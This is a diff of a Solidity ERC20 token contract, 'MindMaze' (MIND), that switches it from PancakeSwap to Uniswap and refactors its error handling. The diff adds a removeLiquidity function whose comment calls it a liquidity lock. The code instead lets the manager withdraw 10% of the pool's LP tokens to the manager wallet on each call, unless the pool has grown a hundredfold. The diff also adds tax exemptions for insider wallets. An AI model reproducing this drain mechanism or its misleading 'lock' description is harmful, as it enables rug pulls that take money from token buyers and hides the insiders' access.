@@ -15,19 +15,19 @@ MIND token will take 5% fees for each buy (2% marketing, 2% dev, 1% burn)
 */
 contract Mind is Ownable, ERC20 {
     error BotAlreadyAdded();
-    error AccountIspancakeRouter();
+    error AccountIsUniswapRouter();
     error AccountIsPair();
     error SenderIsBot();
     error RecipientIsBot();
-    error InvalidArrayLengths();
     error AlreadyCalled();
-    error InLiquidityAdd();
     error NotManager();
     error ExceedsMaxTxAmount();
     error InSwap();
-
-
-    event SwapFees(uint256 takeDev, uint256 takeMarketing, uint256 takeBurn);
+    error SenderAddressIsZero();
+    error RecipientrAddressIsZero();
+    error InsufficientBalance();
+    error UnableToGetWethBalance();
+    error LiquidityLocked();
 
     IUniswapV2Router02 private immutable _router;
 
@@ -38,13 +38,11 @@ contract Mind is Ownable, ERC20 {
 
     bool public tradingActive;
     bool private _liquidityAdded;
-    bool private _inLiquidityAdd;
     bool internal _inSwap;
 
-    uint256 private constant COOLDOWN = 60 seconds;
     uint256 private constant SWAP_FEES_AT = 1000 ether;
     uint256 private _totalSupply;
-
+    uint256 private _initialLiquidityWeth;
 
     //anti bot, check tradings that started the same block when liquidity is added
     uint256 public tradingStartBlock;
@@ -52,12 +50,6 @@ contract Mind is Ownable, ERC20 {
     mapping(address => bool) public taxExcluded;
     mapping(address => bool) public bot;
     mapping(address => uint256) private _balances;
-
-    modifier liquidityAdd() {
-        _inLiquidityAdd = true;
-        _;
-        _inLiquidityAdd = false;
-    }
 
     modifier lockSwap {
         _inSwap = true;
@@ -71,19 +63,21 @@ contract Mind is Ownable, ERC20 {
     }
 
     constructor(
-        address pancakeFactory,
-        address pancakeRouter,
+        address uniswapFactory,
+        address uniswapRouter,
         address payable marketing,
         address payable dev,
         address manager
     ) ERC20('MindMaze', 'MIND') {
         taxExcluded[marketing] = true;
+        taxExcluded[dev] = true;
+        taxExcluded[manager] = true;
         taxExcluded[address(this)] = true;
         marketingWallet = marketing;
         devWallet = dev;
         managerWallet = manager;
-        _router = IUniswapV2Router02(pancakeRouter);
-        IUniswapV2Factory uniswapContract = IUniswapV2Factory(pancakeFactory);
+        _router = IUniswapV2Router02(uniswapRouter);
+        IUniswapV2Factory uniswapContract = IUniswapV2Factory(uniswapFactory);
         pair = uniswapContract.createPair(address(this), _router.WETH());
     }
 
@@ -97,6 +91,7 @@ contract Mind is Ownable, ERC20 {
         _rawTransfer(address(this), devWallet, tokens*25/1000); //2.5%
 
         _addLiquidity(balanceOf(address(this)), msg.value);
+        
 
         if (!tradingActive) {
             tradingActive = true;
@@ -104,19 +99,41 @@ contract Mind is Ownable, ERC20 {
         }
     }
 
+    //lock liquidity if weth balance of pair is 100x from initial weth liquidity provided
     function removeLiquidity() external onlyManager() {
-        //TODO: check market cap to retrieve percentage that can be removed
+        uint256 target = _initialLiquidityWeth * 100;
+        address weth = _router.WETH();
+
+        uint256 pairWethBalance = ERC20(weth).balanceOf(pair);
+
+        if(pairWethBalance >= target) revert LiquidityLocked();
+
+        _removeLiquidity();
     }
 
-    function _addLiquidity(uint256 tokens, uint256 value) private liquidityAdd {
+    function _addLiquidity(uint256 tokens, uint256 value) private {
         _approve(address(this), address(_router), tokens);
-        _router.addLiquidityETH{value: value}(
+        (, uint amountETH, ) = _router.addLiquidityETH{value: value}(
             address(this),
             tokens,
             0,
             0,
             address(this),
             // solhint-disable-next-line not-rely-on-time
+            block.timestamp
+        );
+        _initialLiquidityWeth = amountETH;
+    }
+
+    function _removeLiquidity() private {
+        uint256 amount = ERC20(pair).balanceOf(address(this));
+        ERC20(pair).approve(address(_router), type(uint256).max);
+        _router.removeLiquidityETHSupportingFeeOnTransferTokens(
+            address(this), 
+            amount/10, 
+            1, 
+            1, 
+            managerWallet, 
             block.timestamp
         );
     }
@@ -131,13 +148,13 @@ contract Mind is Ownable, ERC20 {
 
     function _addBot(address account) private {
         if (bot[account]) revert BotAlreadyAdded();
-        if (account == address(_router)) revert AccountIspancakeRouter();
+        if (account == address(_router)) revert AccountIsUniswapRouter();
         if (account == pair) revert AccountIsPair();
         bot[account] = true;
     }
 
     function _transfer(address sender, address recipient, uint256 amount) internal override {
-        if (taxExcluded[sender] || taxExcluded[recipient]) {
+        if (taxExcluded[sender] || taxExcluded[recipient] || !tradingActive) {
             _rawTransfer(sender, recipient, amount);
             return;
         }
@@ -193,11 +210,11 @@ contract Mind is Ownable, ERC20 {
 
     // modified from OpenZeppelin ERC20
     function _rawTransfer(address sender, address recipient, uint256 amount) private {
-        require(sender != address(0), 'transfer from the zero address');
-        require(recipient != address(0), 'transfer to the zero address');
+        if(sender == address(0)) revert SenderAddressIsZero();
+        if(recipient == address(0)) revert RecipientrAddressIsZero();
 
         uint256 senderBalance = balanceOf(sender);
-        require(senderBalance >= amount, 'transfer amount exceeds balance');
+        if(senderBalance < amount) revert InsufficientBalance();
         unchecked {
             _subtractBalance(sender, amount);
         }
@@ -240,21 +257,6 @@ contract Mind is Ownable, ERC20 {
         );
     }
 
-    function _swapTokensForETH(uint256 amount) private {
-        address[] memory path = new address[](2);
-        path[0] = address(this);
-        path[1] = _router.WETH();
-        _approve(address(this), address(_router), amount);
-
-        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
-            amount,
-            0,
-            path,
-            address(this),
-            block.timestamp
-        );
-    }
-
     //50% fees for marketing, 50% fees for dev
     function withdrawFees() external {
         uint256 contractEthBalance = address(this).balance;
@@ -273,6 +275,7 @@ contract Mind is Ownable, ERC20 {
     }
 
     function burn(uint256 amount) external {
+        if(balanceOf(_msgSender()) < amount) revert InsufficientBalance();
         _burn(_msgSender(), amount);
     }
 
